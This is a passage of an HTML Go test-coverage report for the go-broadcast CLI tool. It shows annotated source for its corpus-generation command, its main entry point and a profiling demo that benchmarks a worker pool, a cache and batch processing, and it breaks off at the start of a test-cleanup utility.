
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title>generate-corpus: Go Coverage Report</title>
		<style>
			body {
				background: black;
				color: rgb(80, 80, 80);
			}
			body, pre, #legend span {
				font-family: Menlo, monospace;
				font-weight: bold;
			}
			#topbar {
				background: black;
				position: fixed;
				top: 0; left: 0; right: 0;
				height: 42px;
				border-bottom: 1px solid rgb(80, 80, 80);
			}
			#content {
				margin-top: 50px;
			}
			#nav, #legend {
				float: left;
				margin-left: 10px;
			}
			#legend {
				margin-top: 12px;
			}
			#nav {
				margin-top: 10px;
			}
			#legend span {
				margin: 0 5px;
			}
			.cov0 { color: rgb(192, 0, 0) }
.cov1 { color: rgb(128, 128, 128) }
.cov2 { color: rgb(116, 140, 131) }
.cov3 { color: rgb(104, 152, 134) }
.cov4 { color: rgb(92, 164, 137) }
.cov5 { color: rgb(80, 176, 140) }
.cov6 { color: rgb(68, 188, 143) }
.cov7 { color: rgb(56, 200, 146) }
.cov8 { color: rgb(44, 212, 149) }
.cov9 { color: rgb(32, 224, 152) }
.cov10 { color: rgb(20, 236, 155) }

		</style>
	</head>
	<body>
		<div id="topbar">
			<div id="nav">
				<select id="files">

				<option value="file0">github.com/mrz1836/go-broadcast/cmd/generate-corpus/main.go (0.0%)</option>

				<option value="file1">github.com/mrz1836/go-broadcast/cmd/go-broadcast/main.go (76.9%)</option>

				<option value="file2">github.com/mrz1836/go-broadcast/cmd/profile_demo/main.go (84.8%)</option>

				<option value="file3">github.com/mrz1836/go-broadcast/cmd/test-cleanup/main.go (80.3%)</option>

				<option value="file4">github.com/mrz1836/go-broadcast/internal/algorithms/optimized.go (91.7%)</option>

				<option value="file5">github.com/mrz1836/go-broadcast/internal/benchmark/fixtures.go (97.3%)</option>

				<option value="file6">github.com/mrz1836/go-broadcast/internal/benchmark/helpers.go (98.6%)</option>

				<option value="file7">github.com/mrz1836/go-broadcast/internal/benchmark/reporter.go (95.5%)</option>

				<option value="file8">github.com/mrz1836/go-broadcast/internal/cache/ttl_cache.go (97.0%)</option>

				<option value="file9">github.com/mrz1836/go-broadcast/internal/cli/cancel.go (84.2%)</option>

				<option value="file10">github.com/mrz1836/go-broadcast/internal/cli/diagnose.go (89.2%)</option>

				<option value="file11">github.com/mrz1836/go-broadcast/internal/cli/flags.go (100.0%)</option>

				<option value="file12">github.com/mrz1836/go-broadcast/internal/cli/logger.go (100.0%)</option>

				<option value="file13">github.com/mrz1836/go-broadcast/internal/cli/modules.go (59.1%)</option>

				<option value="file14">github.com/mrz1836/go-broadcast/internal/cli/root.go (88.6%)</option>

				<option value="file15">github.com/mrz1836/go-broadcast/internal/cli/status.go (81.6%)</option>

				<option value="file16">github.com/mrz1836/go-broadcast/internal/cli/sync.go (84.5%)</option>

				<option value="file17">github.com/mrz1836/go-broadcast/internal/cli/validate.go (69.3%)</option>

				<option value="file18">github.com/mrz1836/go-broadcast/internal/cli/version.go (100.0%)</option>

				<option value="file19">github.com/mrz1836/go-broadcast/internal/config/defaults.go (100.0%)</option>

				<option value="file20">github.com/mrz1836/go-broadcast/internal/config/parser.go (100.0%)</option>

				<option value="file21">github.com/mrz1836/go-broadcast/internal/config/types.go (100.0%)</option>

				<option value="file22">github.com/mrz1836/go-broadcast/internal/config/validator.go (64.0%)</option>

				<option value="file23">github.com/mrz1836/go-broadcast/internal/errors/api_errors.go (100.0%)</option>

				<option value="file24">github.com/mrz1836/go-broadcast/internal/errors/errors.go (100.0%)</option>

				<option value="file25">github.com/mrz1836/go-broadcast/internal/errors/file_errors.go (100.0%)</option>

				<option value="file26">github.com/mrz1836/go-broadcast/internal/fuzz/corpus_generator.go (94.6%)</option>

				<option value="file27">github.com/mrz1836/go-broadcast/internal/fuzz/helpers.go (94.9%)</option>

				<option value="file28">github.com/mrz1836/go-broadcast/internal/gh/command.go (95.1%)</option>

				<option value="file29">github.com/mrz1836/go-broadcast/internal/gh/command_mock.go (88.9%)</option>

				<option value="file30">github.com/mrz1836/go-broadcast/internal/gh/github.go (86.7%)</option>

				<option value="file31">github.com/mrz1836/go-broadcast/internal/gh/mock.go (56.0%)</option>

				<option value="file32">github.com/mrz1836/go-broadcast/internal/git/batch.go (0.0%)</option>

				<option value="file33">github.com/mrz1836/go-broadcast/internal/git/git.go (87.0%)</option>

				<option value="file34">github.com/mrz1836/go-broadcast/internal/git/mock.go (70.4%)</option>

				<option value="file35">github.com/mrz1836/go-broadcast/internal/io/streaming.go (94.7%)</option>

				<option value="file36">github.com/mrz1836/go-broadcast/internal/jsonutil/jsonutil.go (95.0%)</option>

				<option value="file37">github.com/mrz1836/go-broadcast/internal/logging/config.go (88.9%)</option>

				<option value="file38">github.com/mrz1836/go-broadcast/internal/logging/formatter.go (92.9%)</option>

				<option value="file39">github.com/mrz1836/go-broadcast/internal/logging/redact.go (92.8%)</option>

				<option value="file40">github.com/mrz1836/go-broadcast/internal/memory/efficient.go (95.4%)</option>

				<option value="file41">github.com/mrz1836/go-broadcast/internal/metrics/timing.go (96.3%)</option>

				<option value="file42">github.com/mrz1836/go-broadcast/internal/monitoring/dashboard.go (94.7%)</option>

				<option value="file43">github.com/mrz1836/go-broadcast/internal/output/output.go (100.0%)</option>

				<option value="file44">github.com/mrz1836/go-broadcast/internal/pool/buffer_pool.go (96.8%)</option>

				<option value="file45">github.com/mrz1836/go-broadcast/internal/profiling/memory.go (92.2%)</option>

				<option value="file46">github.com/mrz1836/go-broadcast/internal/profiling/suite.go (81.0%)</option>

				<option value="file47">github.com/mrz1836/go-broadcast/internal/reporting/performance.go (92.7%)</option>

				<option value="file48">github.com/mrz1836/go-broadcast/internal/state/branch.go (95.7%)</option>

				<option value="file49">github.com/mrz1836/go-broadcast/internal/state/discovery.go (97.3%)</option>

				<option value="file50">github.com/mrz1836/go-broadcast/internal/state/mock.go (85.7%)</option>

				<option value="file51">github.com/mrz1836/go-broadcast/internal/state/pr.go (95.4%)</option>

				<option value="file52">github.com/mrz1836/go-broadcast/internal/strutil/paths.go (97.6%)</option>

				<option value="file53">github.com/mrz1836/go-broadcast/internal/strutil/slices.go (100.0%)</option>

				<option value="file54">github.com/mrz1836/go-broadcast/internal/strutil/strings.go (97.8%)</option>

				<option value="file55">github.com/mrz1836/go-broadcast/internal/sync/batch.go (92.0%)</option>

				<option value="file56">github.com/mrz1836/go-broadcast/internal/sync/cache.go (90.4%)</option>

				<option value="file57">github.com/mrz1836/go-broadcast/internal/sync/dependency.go (96.8%)</option>

				<option value="file58">github.com/mrz1836/go-broadcast/internal/sync/directory.go (48.1%)</option>

				<option value="file59">github.com/mrz1836/go-broadcast/internal/sync/directory_progress.go (100.0%)</option>

				<option value="file60">github.com/mrz1836/go-broadcast/internal/sync/directory_validator.go (94.0%)</option>

				<option value="file61">github.com/mrz1836/go-broadcast/internal/sync/engine.go (76.6%)</option>

				<option value="file62">github.com/mrz1836/go-broadcast/internal/sync/exclusion.go (63.7%)</option>

				<option value="file63">github.com/mrz1836/go-broadcast/internal/sync/github_api.go (95.3%)</option>

				<option value="file64">github.com/mrz1836/go-broadcast/internal/sync/module_cache.go (97.4%)</option>

				<option value="file65">github.com/mrz1836/go-broadcast/internal/sync/module_detector.go (91.5%)</option>

				<option value="file66">github.com/mrz1836/go-broadcast/internal/sync/module_resolver.go (53.8%)</option>

				<option value="file67">github.com/mrz1836/go-broadcast/internal/sync/options.go (73.3%)</option>

				<option value="file68">github.com/mrz1836/go-broadcast/internal/sync/orchestrator.go (68.1%)</option>

				<option value="file69">github.com/mrz1836/go-broadcast/internal/sync/progress.go (89.0%)</option>

				<option value="file70">github.com/mrz1836/go-broadcast/internal/sync/repository.go (79.0%)</option>

				<option value="file71">github.com/mrz1836/go-broadcast/internal/sync/transform_error.go (97.5%)</option>

				<option value="file72">github.com/mrz1836/go-broadcast/internal/testing/mocks/example_refactored.go (0.0%)</option>

				<option value="file73">github.com/mrz1836/go-broadcast/internal/testing/mocks/factory.go (0.0%)</option>

				<option value="file74">github.com/mrz1836/go-broadcast/internal/testing/suite/helper.go (86.3%)</option>

				<option value="file75">github.com/mrz1836/go-broadcast/internal/testutil/files.go (86.7%)</option>

				<option value="file76">github.com/mrz1836/go-broadcast/internal/testutil/mock.go (100.0%)</option>

				<option value="file77">github.com/mrz1836/go-broadcast/internal/testutil/patterns.go (65.3%)</option>

				<option value="file78">github.com/mrz1836/go-broadcast/internal/transform/binary.go (100.0%)</option>

				<option value="file79">github.com/mrz1836/go-broadcast/internal/transform/chain.go (100.0%)</option>

				<option value="file80">github.com/mrz1836/go-broadcast/internal/transform/directory_context.go (100.0%)</option>

				<option value="file81">github.com/mrz1836/go-broadcast/internal/transform/mock.go (90.0%)</option>

				<option value="file82">github.com/mrz1836/go-broadcast/internal/transform/regex_cache.go (94.2%)</option>

				<option value="file83">github.com/mrz1836/go-broadcast/internal/transform/repo.go (100.0%)</option>

				<option value="file84">github.com/mrz1836/go-broadcast/internal/transform/string_builder.go (99.2%)</option>

				<option value="file85">github.com/mrz1836/go-broadcast/internal/transform/template.go (96.1%)</option>

				<option value="file86">github.com/mrz1836/go-broadcast/internal/validation/validation.go (100.0%)</option>

				<option value="file87">github.com/mrz1836/go-broadcast/internal/worker/pool.go (100.0%)</option>

				<option value="file88">github.com/mrz1836/go-broadcast/test/fixtures/generator.go (84.7%)</option>

				<option value="file89">github.com/mrz1836/go-broadcast/test/helpers/auth.go (100.0%)</option>

				<option value="file90">github.com/mrz1836/go-broadcast/test/helpers/git.go (0.0%)</option>

				</select>
			</div>
			<div id="legend">
				<span>not tracked</span>

				<span class="cov0">not covered</span>
				<span class="cov8">covered</span>

			</div>
		</div>
		<div id="content">

		<pre class="file" id="file0" style="display: none">// Command generate-corpus generates the initial fuzz test corpus
package main

import (
        "log"
        "os"

        "github.com/mrz1836/go-broadcast/internal/fuzz"
)

func main() <span class="cov0" title="0">{
        // Use internal/fuzz as base directory
        baseDir := "internal/fuzz"

        // Check if directory exists
        if _, err := os.Stat(baseDir); os.IsNotExist(err) </span><span class="cov0" title="0">{
                log.Fatalf("Directory %s does not exist", baseDir)
        }</span>

        <span class="cov0" title="0">gen := fuzz.NewCorpusGenerator(baseDir)

        log.Println("Generating fuzz test corpus...")
        if err := gen.GenerateAll(); err != nil </span><span class="cov0" title="0">{
                log.Fatalf("Failed to generate corpus: %v", err)
        }</span>

        <span class="cov0" title="0">log.Println("Corpus generation complete!")
        log.Printf("Corpus files created in: %s/corpus/\n", baseDir)</span>
}
</pre>

		<pre class="file" id="file1" style="display: none">// Package main is the entry point for the go-broadcast CLI tool.
package main

import (
        "context"
        "fmt"
        "os"

        "github.com/mrz1836/go-broadcast/internal/cli"
        "github.com/mrz1836/go-broadcast/internal/output"
)

func main() <span class="cov0" title="0">{
        app := NewApp()
        if err := app.Run(os.Args[1:]); err != nil </span><span class="cov0" title="0">{
                os.Exit(1)
        }</span>
}

// App represents the main application with testable components
type App struct {
        outputHandler OutputHandler
        cliExecutor   CLIExecutor
}

// OutputHandler defines interface for output operations
type OutputHandler interface {
        Init()
        Error(string)
}

// CLIExecutor defines interface for CLI execution
type CLIExecutor interface {
        Execute() error
}

// DefaultOutputHandler implements OutputHandler using the output package
type DefaultOutputHandler struct{}

func (d *DefaultOutputHandler) Init() <span class="cov8" title="1">{
        output.Init()
}</span>

func (d *DefaultOutputHandler) Error(msg string) <span class="cov8" title="1">{
        output.Error(msg)
}</span>

// DefaultCLIExecutor implements CLIExecutor using the cli package
type DefaultCLIExecutor struct{}

func (d *DefaultCLIExecutor) Execute() error <span class="cov8" title="1">{
        return cli.ExecuteWithContext(context.Background())
}</span>

// NewApp creates a new App instance with default implementations
func NewApp() *App <span class="cov8" title="1">{
        return &amp;App{
                outputHandler: &amp;DefaultOutputHandler{},
                cliExecutor:   &amp;DefaultCLIExecutor{},
        }
}</span>

// NewAppWithDependencies creates a new App instance with injectable dependencies
func NewAppWithDependencies(outputHandler OutputHandler, cliExecutor CLIExecutor) *App <span class="cov8" title="1">{
        return &amp;App{
                outputHandler: outputHandler,
                cliExecutor:   cliExecutor,
        }
}</span>

// Run executes the application with the given arguments
func (a *App) Run(args []string) error <span class="cov8" title="1">{
        // Initialize colored output
        a.outputHandler.Init()

        // Handle panics gracefully
        defer func() </span><span class="cov8" title="1">{
                if r := recover(); r != nil </span><span class="cov8" title="1">{
                        a.outputHandler.Error(fmt.Sprintf("Fatal error: %v", r))
                }</span>
        }()

        // Execute CLI
        <span class="cov8" title="1">return a.cliExecutor.Execute()</span>
}
</pre>

		<pre class="file" id="file2" style="display: none">// Package main provides a comprehensive demonstration of the profiling capabilities.
// This demo showcases memory profiling, performance benchmarking, and resource monitoring
// across various operations including caching, worker pools, and batch processing.
package main

import (
        "context"
        "crypto/rand"
        "fmt"
        "log"
        "math/big"
        "os"
        "path/filepath"
        "sync"
        "time"

        "github.com/mrz1836/go-broadcast/internal/algorithms"
        "github.com/mrz1836/go-broadcast/internal/cache"
        "github.com/mrz1836/go-broadcast/internal/profiling"
        "github.com/mrz1836/go-broadcast/internal/reporting"
        "github.com/mrz1836/go-broadcast/internal/worker"
)

// secureRandInt generates a cryptographically secure random integer in range [0, maxVal)
func secureRandInt(maxVal int) int <span class="cov8" title="1">{
        if maxVal &lt;= 0 </span><span class="cov8" title="1">{
                return 0
        }</span>
        <span class="cov8" title="1">n, err := rand.Int(rand.Reader, big.NewInt(int64(maxVal)))
        if err != nil </span><span class="cov0" title="0">{
                // Fallback to current time for demo purposes
                return int(time.Now().UnixNano()) % maxVal
        }</span>
        <span class="cov8" title="1">return int(n.Int64())</span>
}

func main() <span class="cov0" title="0">{
        app := NewProfileDemoApp()
        if err := app.Run(); err != nil </span><span class="cov0" title="0">{
                log.Fatalf("Profile demo failed: %v", err)
        }</span>
}

// ProfileDemoApp represents the main profiling demonstration application
type ProfileDemoApp struct {
        logger              Logger
        dirManager          DirectoryManager
        profileSuiteFactory ProfileSuiteFactory
        testRunner          TestRunner
        reportGenerator     ReportGenerator
}

// Logger defines the interface for logging operations
type Logger interface {
        Println(v ...interface{})
        Printf(format string, v ...interface{})
}

// DirectoryManager defines the interface for directory operations
type DirectoryManager interface {
        MkdirAll(path string, perm os.FileMode) error
}

// ProfileSuiteFactory defines the interface for creating profile suites
type ProfileSuiteFactory interface {
        NewProfileSuite(profilesDir string) ProfileSuite
}

// ProfileSuite defines the interface for profiling operations
type ProfileSuite interface {
        Configure(config profiling.ProfileConfig)
        StartProfiling(sessionName string) error
        StopProfiling() error
}

// TestRunner defines the interface for running performance tests
type TestRunner interface {
        TestWorkerPool() time.Duration
        TestTTLCache() time.Duration
        TestAlgorithmOptimizations() time.Duration
        TestBatchProcessing() time.Duration
}

// ReportGenerator defines the interface for generating reports
type ReportGenerator interface {
        GenerateFinalReport(metrics map[string]float64, profilesDir string) error
}

// DefaultLogger implements Logger using the log package
type DefaultLogger struct{}

func (d *DefaultLogger) Println(v ...interface{}) <span class="cov8" title="1">{
        log.Println(v...)
}</span>

func (d *DefaultLogger) Printf(format string, v ...interface{}) <span class="cov8" title="1">{
        log.Printf(format, v...)
}</span>

// DefaultDirectoryManager implements DirectoryManager using os package
type DefaultDirectoryManager struct{}

func (d *DefaultDirectoryManager) MkdirAll(path string, perm os.FileMode) error <span class="cov8" title="1">{
        return os.MkdirAll(path, perm)
}</span>

// DefaultProfileSuiteFactory implements ProfileSuiteFactory
type DefaultProfileSuiteFactory struct{}

func (d *DefaultProfileSuiteFactory) NewProfileSuite(profilesDir string) ProfileSuite <span class="cov0" title="0">{
        return &amp;DefaultProfileSuiteWrapper{suite: profiling.NewProfileSuite(profilesDir)}
}</span>

// DefaultProfileSuiteWrapper wraps the actual profiling.ProfileSuite
type DefaultProfileSuiteWrapper struct {
        suite interface {
                Configure(config profiling.ProfileConfig)
                StartProfiling(sessionName string) error
                StopProfiling() error
        }
}

func (d *DefaultProfileSuiteWrapper) Configure(config profiling.ProfileConfig) <span class="cov0" title="0">{
        d.suite.Configure(config)
}</span>

func (d *DefaultProfileSuiteWrapper) StartProfiling(sessionName string) error <span class="cov0" title="0">{
        return d.suite.StartProfiling(sessionName)
}</span>

func (d *DefaultProfileSuiteWrapper) StopProfiling() error <span class="cov0" title="0">{
        return d.suite.StopProfiling()
}</span>

// DefaultTestRunner implements TestRunner using the original test functions
type DefaultTestRunner struct{}

func (d *DefaultTestRunner) TestWorkerPool() time.Duration <span class="cov8" title="1">{
        start := time.Now()
        testWorkerPool()
        return time.Since(start)
}</span>

func (d *DefaultTestRunner) TestTTLCache() time.Duration <span class="cov0" title="0">{
        start := time.Now()
        testTTLCache()
        return time.Since(start)
}</span>

func (d *DefaultTestRunner) TestAlgorithmOptimizations() time.Duration <span class="cov0" title="0">{
        start := time.Now()
        testAlgorithmOptimizations()
        return time.Since(start)
}</span>

func (d *DefaultTestRunner) TestBatchProcessing() time.Duration <span class="cov0" title="0">{
        start := time.Now()
        testBatchProcessing()
        return time.Since(start)
}</span>

// DefaultReportGenerator implements ReportGenerator using the original function
type DefaultReportGenerator struct{}

func (d *DefaultReportGenerator) GenerateFinalReport(metrics map[string]float64, profilesDir string) error <span class="cov8" title="1">{
        generateFinalReport(metrics, profilesDir)
        return nil
}</span>

// NewProfileDemoApp creates a new ProfileDemoApp with default implementations
func NewProfileDemoApp() *ProfileDemoApp <span class="cov8" title="1">{
        return &amp;ProfileDemoApp{
                logger:              &amp;DefaultLogger{},
                dirManager:          &amp;DefaultDirectoryManager{},
                profileSuiteFactory: &amp;DefaultProfileSuiteFactory{},
                testRunner:          &amp;DefaultTestRunner{},
                reportGenerator:     &amp;DefaultReportGenerator{},
        }
}</span>

// NewProfileDemoAppWithDependencies creates a new ProfileDemoApp with injectable dependencies
func NewProfileDemoAppWithDependencies(logger Logger, dirManager DirectoryManager, profileSuiteFactory ProfileSuiteFactory, testRunner TestRunner, reportGenerator ReportGenerator) *ProfileDemoApp <span class="cov8" title="1">{
        return &amp;ProfileDemoApp{
                logger:              logger,
                dirManager:          dirManager,
                profileSuiteFactory: profileSuiteFactory,
                testRunner:          testRunner,
                reportGenerator:     reportGenerator,
        }
}</span>

// Run executes the profiling demonstration
func (app *ProfileDemoApp) Run() error <span class="cov8" title="1">{
        app.logger.Println("Starting comprehensive profiling demonstration...")

        // Initialize profiling suite
        profilesDir := "./profiles/final_demo"
        if err := app.dirManager.MkdirAll(profilesDir, 0o750); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to create profiles directory: %w", err)
        }</span>

        <span class="cov8" title="1">suite := app.profileSuiteFactory.NewProfileSuite(profilesDir)

        // Configure comprehensive profiling
        config := profiling.ProfileConfig{
                EnableCPU:            false, // Disabled to avoid conflicts
                EnableMemory:         true,
                EnableTrace:          false, // Disabled to reduce overhead
                EnableBlock:          false,
                EnableMutex:          false,
                BlockProfileRate:     1,
                MutexProfileFraction: 1,
                GenerateReports:      true,
                ReportFormat:         "text",
                AutoCleanup:          false,
                MaxSessionsToKeep:    10,
        }
        suite.Configure(config)

        // Start profiling session
        if err := suite.StartProfiling("final_optimization_demo"); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to start profiling: %w", err)
        }</span>

        <span class="cov8" title="1">app.logger.Println("Profiling started - running optimization demonstrations...")

        // Create performance metrics collector
        metrics := make(map[string]float64)

        // Run performance tests
        app.logger.Println("1. Testing Worker Pool optimization...")
        duration := app.testRunner.TestWorkerPool()
        metrics["worker_pool_duration_ms"] = float64(duration.Nanoseconds()) / 1e6

        app.logger.Println("2. Testing TTL Cache optimization...")
        duration = app.testRunner.TestTTLCache()
        metrics["cache_duration_ms"] = float64(duration.Nanoseconds()) / 1e6

        app.logger.Println("3. Testing Algorithm optimizations...")
        duration = app.testRunner.TestAlgorithmOptimizations()
        metrics["algorithms_duration_ms"] = float64(duration.Nanoseconds()) / 1e6

        app.logger.Println("4. Testing Batch Processing optimization...")
        duration = app.testRunner.TestBatchProcessing()
        metrics["batch_processing_duration_ms"] = float64(duration.Nanoseconds()) / 1e6

        app.logger.Println("Optimization demonstrations completed - stopping profiling...")

        // Stop profiling
        if err := suite.StopProfiling(); err != nil </span><span class="cov8" title="1">{
                app.logger.Printf("Warning: failed to stop profiling: %v", err)
        }</span>

        // Generate performance report
        <span class="cov8" title="1">app.logger.Println("Generating comprehensive performance report...")
        if err := app.reportGenerator.GenerateFinalReport(metrics, profilesDir); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to generate report: %w", err)
        }</span>

        <span class="cov8" title="1">app.logger.Println("Final profiling demonstration completed successfully!")
        app.logger.Printf("Results available in: %s\n", profilesDir)

        return nil</span>
}

func testWorkerPool() <span class="cov8" title="1">{
        // Create worker pool with optimal worker count
        pool := worker.NewPool(8, 100) // 8 workers, 100 queue size

        pool.Start(context.Background())
        defer pool.Shutdown()

        // Submit intensive tasks (reduced for demo)
        var wg sync.WaitGroup
        taskCount := 100

        for i := 0; i &lt; taskCount; i++ </span><span class="cov8" title="1">{
                wg.Add(1)
                task := &amp;intensiveTask{
                        id: i,
                        wg: &amp;wg,
                }
                if err := pool.Submit(task); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to submit task: %v", err)
                }</span>
        }

        <span class="cov8" title="1">wg.Wait()</span>
}

func testTTLCache() <span class="cov8" title="1">{
        // Create TTL cache
        ttlCache := cache.NewTTLCache(time.Minute*5, 10000) // 5 min TTL, 10k max size

        // Perform cache operations (reduced for demo)
        operationCount := 1000

        // Mix of sets and gets to simulate realistic usage
        for i := 0; i &lt; operationCount; i++ </span><span class="cov8" title="1">{
                key := fmt.Sprintf("key_%d", secureRandInt(1000))

                if i%3 == 0 </span><span class="cov8" title="1">{
                        // Set operation
                        value := fmt.Sprintf("data_%d_%s", i, generateTestData(100))
                        ttlCache.Set(key, value)
                }</span> else<span class="cov8" title="1"> {
                        // Get operation
                        ttlCache.Get(key)
                }</span>
        }
}

func testAlgorithmOptimizations() <span class="cov8" title="1">{
        // Test binary detection optimization
        testData := [][]byte{
                []byte("This is text content for testing"),
                generateBinaryData(1024),
                generateTextData(2048),
                generateBinaryData(4096),
                generateTextData(8192),
        }

        for _, data := range testData </span><span class="cov8" title="1">{
                algorithms.IsBinaryOptimized(data)
        }</span>

        // Test diff optimization (reduced for demo)
        <span class="cov8" title="1">for i := 0; i &lt; 10; i++ </span><span class="cov8" title="1">{
                data1 := generateTextData(512)
                data2 := modifyData(data1, 0.1) // 10% modification
                algorithms.DiffOptimized(data1, data2, 1024*1024)
        }</span>
}

func testBatchProcessing() <span class="cov8" title="1">{
        // Create batch processor
        config := algorithms.DefaultBatchProcessorConfig()
        config.BatchSize = 50
        config.FlushInterval = time.Millisecond * 100

        processor := algorithms.NewBatchProcessor(func(items []interface{}) error </span><span class="cov8" title="1">{
                // Simulate processing work
                time.Sleep(time.Microsecond * time.Duration(len(items)*10))
                return nil
        }</span>, config)

        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                if err := processor.Stop(); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to stop processor: %v\n", err)
                }</span>
        }()

        // Submit batch items (reduced for demo)
        <span class="cov8" title="1">itemCount := 100
        for i := 0; i &lt; itemCount; i++ </span><span class="cov8" title="1">{
                item := fmt.Sprintf("item_%d_%s", i, generateTestData(50))
                if err := processor.Add(item); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to add item: %v\n", err)
                }</span>
        }

        // Ensure final flush
        <span class="cov8" title="1">if err := processor.Flush(); err != nil </span><span class="cov0" title="0">{
                log.Printf("Warning: failed to flush processor: %v\n", err)
        }</span>
}

func generateFinalReport(metrics map[string]float64, profilesDir string) <span class="cov8" title="1">{
        // Create performance reporter
        reportConfig := reporting.DefaultReportConfig()
        reportConfig.OutputDirectory = profilesDir
        reportConfig.GenerateHTML = true
        reportConfig.GenerateJSON = true
        reportConfig.GenerateMarkdown = true

        reporter := reporting.NewPerformanceReporter(reportConfig)

        // Create mock test results
        testResults := []reporting.TestResult{
                {
                        Name:       "Worker Pool Optimization",
                        Duration:   time.Duration(metrics["worker_pool_duration_ms"]) * time.Millisecond,
                        Success:    true,
                        Throughput: 1000.0 / (metrics["worker_pool_duration_ms"] / 1000.0), // tasks/sec
                        MemoryUsed: 10,                                                     // MB estimate
                },
                {
                        Name:       "TTL Cache Optimization",
                        Duration:   time.Duration(metrics["cache_duration_ms"]) * time.Millisecond,
                        Success:    true,
                        Throughput: 10000.0 / (metrics["cache_duration_ms"] / 1000.0), // ops/sec
                        MemoryUsed: 5,                                                 // MB estimate
                },
                {
                        Name:       "Algorithm Optimizations",
                        Duration:   time.Duration(metrics["algorithms_duration_ms"]) * time.Millisecond,
                        Success:    true,
                        Throughput: 500.0 / (metrics["algorithms_duration_ms"] / 1000.0), // ops/sec
                        MemoryUsed: 3,                                                    // MB estimate
                },
                {
                        Name:       "Batch Processing Optimization",
                        Duration:   time.Duration(metrics["batch_processing_duration_ms"]) * time.Millisecond,
                        Success:    true,
                        Throughput: 1000.0 / (metrics["batch_processing_duration_ms"] / 1000.0), // items/sec
                        MemoryUsed: 2,                                                           // MB estimate
                },
        }

        // Create profile summary
        profileSummary := reporting.ProfileSummary{
                CPUProfile: reporting.ProfileInfo{
                        Available: true,
                        Size:      1024 * 1024, // 1MB estimate
                        Path:      filepath.Join(profilesDir, "cpu.prof"),
                },
                MemoryProfile: reporting.ProfileInfo{
                        Available: true,
                        Size:      512 * 1024, // 512KB estimate
                        Path:      filepath.Join(profilesDir, "memory.prof"),
                },
                GoroutineProfile: reporting.ProfileInfo{
                        Available: true,
                        Size:      256 * 1024, // 256KB estimate
                        Path:      filepath.Join(profilesDir, "goroutine.prof"),
                },
                TotalProfileSize: 1024*1024 + 512*1024 + 256*1024,
        }

        // Generate comprehensive report
        report, err := reporter.GenerateReport(metrics, testResults, profileSummary)
        if err != nil </span><span class="cov0" title="0">{
                log.Printf("Failed to generate report: %v", err)
                return
        }</span>

        // Save report
        <span class="cov8" title="1">if err := reporter.SaveReport(report); err != nil </span><span class="cov8" title="1">{
                log.Printf("Failed to save report: %v", err)
                return
        }</span>

        <span class="cov8" title="1">log.Printf("Final performance report generated: %s\n", reportConfig.OutputDirectory)</span>
}

// Helper types and functions

type intensiveTask struct {
        id int
        wg *sync.WaitGroup
}

func (t *intensiveTask) Execute(_ context.Context) error <span class="cov8" title="1">{
        defer t.wg.Done()

        // Simulate CPU work (reduced for demo)
        sum := 0
        for i := 0; i &lt; 1000; i++ </span><span class="cov8" title="1">{
                sum += i * t.id
        }</span>

        // Simulate some memory allocation
        <span class="cov8" title="1">data := make([]byte, 1024)
        for i := range data </span><span class="cov8" title="1">{
                data[i] = byte(sum % 256)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

func (t *intensiveTask) Name() string <span class="cov8" title="1">{
        return fmt.Sprintf("intensive_task_%d", t.id)
}</span>

func generateTestData(size int) string <span class="cov8" title="1">{
        chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        result := make([]byte, size)
        for i := range result </span><span class="cov8" title="1">{
                result[i] = chars[secureRandInt(len(chars))]
        }</span>
        <span class="cov8" title="1">return string(result)</span>
}

func generateBinaryData(size int) []byte <span class="cov8" title="1">{
        data := make([]byte, size)
        if _, err := rand.Read(data); err != nil </span><span class="cov0" title="0">{
                // Fall back to deterministic data for demo
                for i := range data </span><span class="cov0" title="0">{
                        data[i] = byte(i % 256)
                }</span>
        }
        // Ensure some null bytes to trigger binary detection
        <span class="cov8" title="1">for i := 0; i &lt; size/10; i++ </span><span class="cov8" title="1">{
                data[secureRandInt(size)] = 0
        }</span>
        <span class="cov8" title="1">return data</span>
}

func generateTextData(size int) []byte <span class="cov8" title="1">{
        chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \n\t"
        result := make([]byte, size)
        for i := range result </span><span class="cov8" title="1">{
                result[i] = chars[secureRandInt(len(chars))]
        }</span>
        <span class="cov8" title="1">return result</span>
}

func modifyData(data []byte, ratio float64) []byte <span class="cov8" title="1">{
        result := make([]byte, len(data))
        copy(result, data)

        modifyCount := int(float64(len(data)) * ratio)

        // For small data or high ratios, ensure unique positions
        if modifyCount &gt; 0 &amp;&amp; len(data) &gt; 0 </span><span class="cov8" title="1">{
                if modifyCount &gt;= len(data) </span><span class="cov8" title="1">{
                        // Modify all positions
                        for i := range result </span><span class="cov8" title="1">{
                                result[i] = byte(secureRandInt(256))
                        }</span>
                } else<span class="cov8" title="1"> {
                        // Create a list of all positions and shuffle to get unique positions
                        positions := make([]int, len(data))
                        for i := range positions </span><span class="cov8" title="1">{
                                positions[i] = i
                        }</span>

                        // Fisher-Yates shuffle to randomize positions
                        <span class="cov8" title="1">for i := len(positions) - 1; i &gt; 0; i-- </span><span class="cov8" title="1">{
                                j := secureRandInt(i + 1)
                                positions[i], positions[j] = positions[j], positions[i]
                        }</span>

                        // Modify the first modifyCount positions from the shuffled list
                        <span class="cov8" title="1">for i := 0; i &lt; modifyCount; i++ </span><span class="cov8" title="1">{
                                result[positions[i]] = byte(secureRandInt(256))
                        }</span>
                }
        }

        <span class="cov8" title="1">return result</span>
}
</pre>

		<pre class="file" id="file3" style="display: none">// Package main provides a test cleanup utility for removing test artifacts and temporary files.
package main

import (
        "flag"
        "fmt"
        "log"
        "os"
        "path/filepath"
        "strings"
)

// TestCleanupConfig holds configuration for cleanup operations
type TestCleanupConfig struct {
        RootDir     string
        DryRun      bool
        Verbose     bool
        Patterns    []string
        ExcludeDirs []string
}

func main() <span class="cov0" title="0">{
        app := NewTestCleanupApp()
